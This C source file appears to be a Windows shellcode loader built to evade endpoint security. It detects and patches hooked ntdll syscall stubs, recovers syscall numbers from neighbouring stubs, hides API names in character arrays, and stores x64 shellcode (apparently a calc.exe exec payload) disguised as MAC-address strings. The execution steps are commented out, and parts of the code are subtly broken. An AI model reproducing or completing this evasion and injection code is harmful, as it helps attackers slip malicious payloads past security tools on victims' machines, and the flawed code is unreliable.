#include <windows.h>
#include <stdio.h>
#include <rpc.h>
#include <winternl.h>
// #include <ip2string.h>
#pragma comment(lib, "ntdll")

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_INVALID_PARAMETER
#define STATUS_INVALID_PARAMETER ((NTSTATUS)0xC000000DL)
#endif


typedef struct _DL_EUI48 {
    BYTE Data[6];
} DL_EUI48, *PDL_EUI48;

NTSTATUS RtlEthernetStringToAddressA(const char* S, const char** Terminator, DL_EUI48* Addr) {
    if (S == NULL || Addr == NULL) return STATUS_INVALID_PARAMETER;

    int values[6];
    if (sscanf(S, "%x-%x-%x-%x-%x-%x%c",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) == 6) {
        for (int i = 0; i < 6; ++i) {
            Addr->Data[i] = (BYTE)values[i];
        }
        if (Terminator) *Terminator = S + 17; // Point to the end (or next character) after the MAC address
        return STATUS_SUCCESS;
    }
    return STATUS_INVALID_PARAMETER;
}


#define NtCurrentProcess()	   ((HANDLE)-1)

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

#pragma comment(lib, "Rpcrt4.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define UP -32
#define DOWN 32


// EXTERN_C NTSTATUS NtAllocateVirtualMemory(
//     HANDLE    ProcessHandle,
//     PVOID* BaseAddress,
//     ULONG_PTR ZeroBits,
//     PSIZE_T   RegionSize,
//     ULONG     AllocationType,
//     ULONG     Protect
// );

// EXTERN_C NTSTATUS NtProtectVirtualMemory(
//     IN HANDLE ProcessHandle,
//     IN OUT PVOID* BaseAddress,
//     IN OUT PSIZE_T RegionSize,
//     IN ULONG NewProtect,
//     OUT PULONG OldProtect);



// EXTERN_C NTSTATUS NtCreateThreadEx(
//     OUT PHANDLE hThread,
//     IN ACCESS_MASK DesiredAccess,
//     IN PVOID ObjectAttributes,
//     IN HANDLE ProcessHandle,
//     IN PVOID lpStartAddress,
//     IN PVOID lpParameter,
//     IN ULONG Flags,
//     IN SIZE_T StackZeroBits,
//     IN SIZE_T SizeOfStackCommit,
//     IN SIZE_T SizeOfStackReserve,
//     OUT PVOID lpBytesBuffer
// );

// EXTERN_C NTSTATUS NtWaitForSingleObject(
//     IN HANDLE         Handle,
//     IN BOOLEAN        Alertable,
//     IN PLARGE_INTEGER Timeout
// );
// Define function pointer types for the NT functions
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect);

typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE hThread,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID lpStartAddress,
    PVOID lpParameter,
    ULONG Flags,
    SIZE_T StackZeroBits,
    SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve,
    PVOID lpBytesBuffer);

typedef NTSTATUS (NTAPI *pNtWaitForSingleObject)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout);
    
// Declare global function pointers
pNtAllocateVirtualMemory myNtAllocateVirtualMemory = NULL;
pNtProtectVirtualMemory myNtProtectVirtualMemory = NULL;
pNtCreateThreadEx myNtCreateThreadEx = NULL;
pNtWaitForSingleObject myNtWaitForSingleObject = NULL;

struct LDR_MODULE {
    LIST_ENTRY e[3];
    HMODULE base;
    void* entry;
    UINT size;
    UNICODE_STRING dllPath;
    UNICODE_STRING dllname;
};



BOOL isItHooked(LPVOID addr) {
    BYTE stub[] = "\x4c\x8b\xd1\xb8";
    if (memcmp(addr, stub, 4) != 0) 
        return TRUE;
    return FALSE;
}


WORD GetsyscallNum(LPVOID addr) {


    WORD syscall = 0;

    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == 0xd1
        && *((PBYTE)addr + 3) == 0xb8
        && *((PBYTE)addr + 6) == 0x00
        && *((PBYTE)addr + 7) == 0x00) {

        BYTE high = *((PBYTE)addr + 5);
        BYTE low = *((PBYTE)addr + 4);
        syscall = (high << 8) | low;

        return syscall;

    }

    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {

        for (WORD idx = 1; idx <= 500; idx++) {
            if (*((PBYTE)addr + idx * DOWN) == 0x4c
                && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
                && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
                && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
                && *((PBYTE)addr + 6 + idx * DOWN) == 0x00
                && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * DOWN);
                BYTE low = *((PBYTE)addr + 4 + idx * DOWN);
                syscall = (high << 8) | low - idx;

                return syscall;
            }
            if (*((PBYTE)addr + idx * UP) == 0x4c
                && *((PBYTE)addr + 1 + idx * UP) == 0x8b
                && *((PBYTE)addr + 2 + idx * UP) == 0xd1
                && *((PBYTE)addr + 3 + idx * UP) == 0xb8
                && *((PBYTE)addr + 6 + idx * UP) == 0x00
                && *((PBYTE)addr + 7 + idx * UP) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * UP);
                BYTE low = *((PBYTE)addr + 4 + idx * UP);

                syscall = (high << 8) | low + idx;

                return syscall;

            }

        }

    }
}

DWORD64 GetsyscallInstr(LPVOID addr) {


    WORD syscall = 0;

    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == 0xd1
        && *((PBYTE)addr + 3) == 0xb8
        && *((PBYTE)addr + 6) == 0x00
        && *((PBYTE)addr + 7) == 0x00) {

        return (INT_PTR)addr + 0x12;    // syscall

    }

    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {

        for (WORD idx = 1; idx <= 500; idx++) {
            if (*((PBYTE)addr + idx * DOWN) == 0x4c
                && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
                && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
                && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
                && *((PBYTE)addr + 6 + idx * DOWN) == 0x00
                && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {

                return (INT_PTR)addr + 0x12;
            }
            if (*((PBYTE)addr + idx * UP) == 0x4c
                && *((PBYTE)addr + 1 + idx * UP) == 0x8b
                && *((PBYTE)addr + 2 + idx * UP) == 0xd1
                && *((PBYTE)addr + 3 + idx * UP) == 0xb8
                && *((PBYTE)addr + 6 + idx * UP) == 0x00
                && *((PBYTE)addr + 7 + idx * UP) == 0x00) {

                return (INT_PTR)addr + 0x12;

            }

        }

    }

}


BOOL UnhookPatch(LPVOID addr) {

    DWORD oldprotect = 0;
   
    BYTE syscallNum = GetsyscallNum(addr);
    DWORD64 syscallInst = GetsyscallInstr(addr);
    
    // mov     r10, rcx        
    // mov     eax, SSN
    // syscall
    // retn

    BYTE patch[] = { 0x49, 0x89, 0xCA, 0xB8, 0xBC, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3, 0x90, 0x90, 0x90, 0x90 };

    // syscall
    patch[4] = syscallNum;

    // syscall instruction
    patch[8] = *(BYTE*)syscallInst;
    patch[9] = *(BYTE*)(syscallInst + 0x1);

    BOOL status1 = VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
    if (!status1) {
        printf("Failed in changing protection (%u)\n", GetLastError());
        return FALSE;
    }

    memcpy(addr, patch, sizeof(patch));


    BOOL status2 = VirtualProtect(addr, 4096, oldprotect, &oldprotect);
    if (!status2) {
        printf("Failed in changing protection back (%u)\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

int main() {

   

    PVOID BaseAddress = NULL;
    SIZE_T dwSize = 0x2000;

    
    const char* MAC[] =
    {
        "FC-48-83-E4-F0-E8",
        "C0-00-00-00-41-51",
        "41-50-52-51-56-48",
        "31-D2-65-48-8B-52",
        "60-48-8B-52-18-48",
        "8B-52-20-48-8B-72",
        "50-48-0F-B7-4A-4A",
        "4D-31-C9-48-31-C0",
        "AC-3C-61-7C-02-2C",
        "20-41-C1-C9-0D-41",
        "01-C1-E2-ED-52-41",
        "51-48-8B-52-20-8B",
        "42-3C-48-01-D0-8B",
        "80-88-00-00-00-48",
        "85-C0-74-67-48-01",
        "D0-50-8B-48-18-44",
        "8B-40-20-49-01-D0",
        "E3-56-48-FF-C9-41",
        "8B-34-88-48-01-D6",
        "4D-31-C9-48-31-C0",
        "AC-41-C1-C9-0D-41",
        "01-C1-38-E0-75-F1",
        "4C-03-4C-24-08-45",
        "39-D1-75-D8-58-44",
        "8B-40-24-49-01-D0",
        "66-41-8B-0C-48-44",
        "8B-40-1C-49-01-D0",
        "41-8B-04-88-48-01",
        "D0-41-58-41-58-5E",
        "59-5A-41-58-41-59",
        "41-5A-48-83-EC-20",
        "41-52-FF-E0-58-41",
        "59-5A-48-8B-12-E9",
        "57-FF-FF-FF-5D-48",
        "BA-01-00-00-00-00",
        "00-00-00-48-8D-8D",
        "01-01-00-00-41-BA",
        "31-8B-6F-87-FF-D5",
        "BB-E0-1D-2A-0A-41",
        "BA-A6-95-BD-9D-FF",
        "D5-48-83-C4-28-3C",
        "06-7C-0A-80-FB-E0",
        "75-05-BB-47-13-72",
        "6F-6A-00-59-41-89",
        "DA-FF-D5-63-61-6C",
        "63-2E-65-78-65-00",
    };


    const char ntdll[] = { 'n','t','d','l','l','.','d','l','l', 0 };
    const char NtAlloc[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };

    // LPVOID pNtAlloc = GetProcAddress(GetModuleHandleA(ntdll), NtAlloc);
    // LPVOID pNtAlloc = (LPVOID)GetProcAddress(GetModuleHandleA(ntdll), NtAlloc);
    myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA(ntdll), NtAlloc);

    if (!myNtAllocateVirtualMemory) {
        printf("Failed to get address for NtAllocateVirtualMemory\n");
        return 1; // Or appropriate error handling
    }



    // if (isItHooked(myNtAllocateVirtualMemory)) {
    if (isItHooked(reinterpret_cast<LPVOID>(myNtAllocateVirtualMemory))) {
        printf("[-] NtAllocateVirtualMemory Hooked\n");
        if (!UnhookPatch((LPVOID)(uintptr_t)myNtAllocateVirtualMemory)) {
        // if (!UnhookPatch(myNtAllocateVirtualMemory)) {
            printf("Failed in Unhooking NtCreateThreadEx\n");
        }
        printf("\t[+] NtCreateThreadEx UnHooked\n");
    }
    else {
        printf("[+] NtAllocateVirtualMemory Not Hooked\n");
    }
    



    NTSTATUS status1 = myNtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status1)) {
        printf("[!] Failed in NtAllocateVirtualMemory (%u)\n", GetLastError());
        return 1;
    }


    // int rowLen = sizeof(MAC) / sizeof(MAC[0]);
    // PCSTR Terminator = NULL;
    // NTSTATUS STATUS;

    // DWORD_PTR ptr = (DWORD_PTR)BaseAddress;
    // for (int i = 0; i < rowLen; i++) {
    //     STATUS = RtlEthernetStringToAddressA((PCSTR)MAC[i], &Terminator, (DL_EUI48*)ptr);
    //     if (!NT_SUCCESS(STATUS)) {
    //         return FALSE;
    //     }
    //     ptr += 6;

    // }

    // HANDLE hThread;
    // DWORD OldProtect = 0;


    // const char NtProtect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };

    // NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(GetModuleHandleA(ntdll), NtProtect);
    // // LPVOID pNtProtect = (LPVOID)GetProcAddress(GetModuleHandleA(ntdll), NtProtect);

    // if (isItHooked(pNtProtect)) {
    //     printf("[-] NtProtectVirtualMemory Hooked\n");
    //     if (!UnhookPatch(pNtProtect)) {
    //         printf("Failed in Unhooking NtCreateThreadEx\n");
    //     }
    //     printf("\t[+] NtCreateThreadEx UnHooked\n");
    // }
    // else {
    //     printf("[+] NtProtectVirtualMemory Not Hooked\n");
    // }
    

    // NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
    // if (!NT_SUCCESS(NtProtectStatus1)) {
    //     printf("[!] Failed in sysNtProtectVirtualMemory1 (%u)\n", GetLastError());
    //     return 2;
    // }


    // HANDLE hHostThread = INVALID_HANDLE_VALUE;

    // const char NtCreateTh[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x', 0 };


    // NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA(ntdll), NtCreateTh);
    // // LPVOID pNtCreateThreadEx = (LPVOID)GetProcAddress(GetModuleHandleA(ntdll), NtCreateTh);
    // if (isItHooked(pNtCreateThreadEx)) {
    //     printf("[-] NtCreateThreadEx Hooked\n");
    //     if (!UnhookPatch(pNtCreateThreadEx)) {
    //         printf("Failed in Unhooking NtCreateThreadEx\n");
    //     }
    //     printf("\t[+] NtCreateThreadEx UnHooked\n");
        
    // }
    // else {
    //     printf("[+] NtCreateThreadEx Not Hooked\n");
    // }


    // // NTSTATUS NtCreateThreadstatus = NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    // NTSTATUS NtCreateThreadstatus = NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (PVOID)BaseAddress, NULL, FALSE, 0, 0, 0, NULL);

    // if (!NT_SUCCESS(NtCreateThreadstatus)) {
    //     printf("[!] Failed in sysNtCreateThreadEx (%u)\n", GetLastError());
    //     return 3;
    // }



    // LARGE_INTEGER Timeout;
    // Timeout.QuadPart = -10000000;


    
    // const char NtWait[] = { 'N','t','W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t', 0 };

    // NtWaitForSingleObject = (pNtWaitForSingleObject)GetProcAddress(GetModuleHandleA(ntdll), NtWait);
    // // LPVOID pNtWait = (LPVOID)GetProcAddress(GetModuleHandleA(ntdll), NtWait);

    // if (isItHooked(NtWaitForSingleObject)) {
    //     printf("[-] NtWaitForSingleObject Hooked\n");
    //     if (!UnhookPatch(NtWaitForSingleObject)) {
    //         printf("Failed in Unhooking NtWaitForSingleObject\n");
    //     }
    //     printf("\t[+] NtWaitForSingleObject UnHooked\n");
    // }
    // else {
    //     printf("[+] NtWaitForSingleObject Not Hooked\n");
    // }


    // NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
    // if (!NT_SUCCESS(NTWFSOstatus)) {
    //     printf("[!] Failed in sysNtWaitForSingleObject (%u)\n", GetLastError());
    //     return 4;
    // }

    printf("[+] Finished !!!!\n");

    return 0;

}